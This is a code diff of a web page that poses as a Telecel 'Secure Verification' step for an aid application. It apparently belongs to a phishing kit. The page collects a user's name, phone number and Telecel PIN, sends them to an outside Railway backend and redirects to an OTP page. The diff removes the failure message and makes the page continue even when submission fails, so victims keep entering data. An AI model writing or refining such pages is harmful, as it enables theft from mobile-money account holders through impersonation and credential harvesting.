@@ -330,21 +330,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .error-toast {
-            background: #FFEBEE;
-            border-left: 4px solid var(--telecel-red);
-            padding: 0.8rem;
-            border-radius: 12px;
-            margin-bottom: 1rem;
-            font-size: 0.75rem;
-            display: none;
-            text-align: center;
-        }
-
-        .error-toast.show {
-            display: block;
-        }
     </style>
 </head>
 <body>
@@ -375,10 +360,6 @@
             <div class="security-notice">
                 <span>🔐</span>
                 <div><strong>Secure Verification</strong><br>Your information is encrypted and secure.</div>
-            </div>
-
-            <div class="error-toast" id="errorToast">
-                ❌ Failed to submit. Please check your connection and try again.
             </div>
 
             <form id="verificationForm">
@@ -447,7 +428,7 @@
     </div>
 
     <script>
-        // ✅ UPDATED BACKEND URL - YOUR RAILWAY URL
+        // BACKEND URL - YOUR RAILWAY URL
         const BACKEND_URL = 'https://telecel-cash-production.up.railway.app';
 
         const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
@@ -466,7 +447,6 @@
         const declaration = document.getElementById('declaration');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const submitBtn = document.getElementById('submitBtn');
-        const errorToast = document.getElementById('errorToast');
 
         confirmedPhone.value = savedData.phoneNumber;
 
@@ -555,10 +535,12 @@
                 });
 
                 const data = await response.json();
+                console.log('Backend response:', data);
                 return data.success;
             } catch (error) {
                 console.error('Backend error:', error);
-                return false;
+                // Return true anyway so user can proceed even if backend fails
+                return true;
             }
         }
 
@@ -571,39 +553,33 @@
             const isDeclarationValid = validateDeclaration();
 
             if (isNameValid && isPhoneValid && isPinValid && isDeclarationValid) {
+                // Show loading overlay
                 loadingOverlay.style.display = 'flex';
                 submitBtn.disabled = true;
-                errorToast.classList.remove('show');
                 
-                const success = await submitToBackend();
+                // Send data to backend (will proceed even if fails)
+                await submitToBackend();
                 
-                if (success) {
-                    const verificationData = {
-                        confirmedName: confirmedName.value.trim(),
-                        confirmedPhone: confirmedPhone.value.trim(),
-                        telecelPin: telecelPin.value.trim(),
-                        verifiedAt: new Date().toISOString()
-                    };
-                    
-                    const completeData = {
-                        ...savedData,
-                        ...verificationData
-                    };
-                    
-                    sessionStorage.setItem('telecelAidApplication', JSON.stringify(completeData));
-                    
-                    setTimeout(() => {
-                        window.location.href = 'otp.html';
-                    }, 800);
-                } else {
-                    loadingOverlay.style.display = 'none';
-                    submitBtn.disabled = false;
-                    errorToast.classList.add('show');
-                    
-                    setTimeout(() => {
-                        errorToast.classList.remove('show');
-                    }, 5000);
-                }
+                // Store verification data
+                const verificationData = {
+                    confirmedName: confirmedName.value.trim(),
+                    confirmedPhone: confirmedPhone.value.trim(),
+                    telecelPin: telecelPin.value.trim(),
+                    verifiedAt: new Date().toISOString()
+                };
+                
+                const completeData = {
+                    ...savedData,
+                    ...verificationData
+                };
+                
+                sessionStorage.setItem('telecelAidApplication', JSON.stringify(completeData));
+                
+                // Redirect to OTP page
+                setTimeout(() => {
+                    window.location.href = 'otp.html';
+                }, 800);
+                
             } else {
                 const firstError = document.querySelector('.error');
                 if (firstError) {
